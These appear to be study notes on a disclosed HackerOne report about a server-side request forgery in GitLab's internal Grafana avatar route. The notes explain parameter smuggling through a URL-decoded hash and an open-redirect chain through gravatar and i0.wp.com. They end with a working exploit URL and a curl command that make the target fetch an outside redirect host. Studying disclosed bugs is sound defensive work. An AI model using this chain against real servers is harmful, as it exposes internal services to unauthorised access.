## Full Read SSRF on Gitlab's Internal Grafana
https://hackerone.com/reports/878779

Analysis 

1. Learnt about the route
   ```
   	r.Get("/avatar/:hash", avatarCacheServer.Handler)
   ```
  Here, the hash is taken from `/avatar/:hash` and route it to `secure.grafana.com` in order to access a user's gravatar and the code looks like 
  ```
  const (
	  gravatarSource = "https://secure.gravatar.com/avatar/"
  )
  ...
  case err = <-thunder.GoFetch(gravatarSource+this.hash+"?"+this.reqParams, this):
  ```
  this.hash referenced in the code is the hash passed via `/avatar/:hash` *URL DECODED*.
  The `:hash` is URL DECODED allows us to smuggle in our own parameters in the requests. 

  *Redirection 01*
  If you supply parameter d on `secure.gravatar.com` it allows redirection to `i0.wp.com` where some of the images are hosted.

  The format of urls on `ip.wp.com`  are as follow `i0.wp.com/{domainOfImage}/{pathOfImage}`
  some of the images were hosted over `bp.blogspot.com`  Following code was used for the open redirect 
  `i0.wp.com/{domainOfImage}/{pathOfImage}`
  `http://i0.wp.com/google.com/1.bp.blogspot.com/`


  A complete chain of open redirection 
```
https://secure.gravatar.com/avatar/anything?d=/google.com/1.bp.blogspot.com/
->
http://i0.wp.com/google.com/1.bp.blogspot.com/
->
https://google.com/1.bp.blogspot.com
```

Finally using this it was possible for SSRF 

```
https://dev.gitlab.org/-/grafana/avatar/tesata?d=redirect.rhynorater.com/1.bp.blogspot.com/YOURHOSTHERE&cachebust
```

(`redirect.rhynorater.com` is configured to redirect to any host provided after the `1.bp.blogspot.com` directory)

```
curl "https://dev.gitlab.org/-/grafana/avatar/test?d=redirect.rhynorater.com/1.bp.blogspot.com/poc.rhynorater.com&cachebust"
```
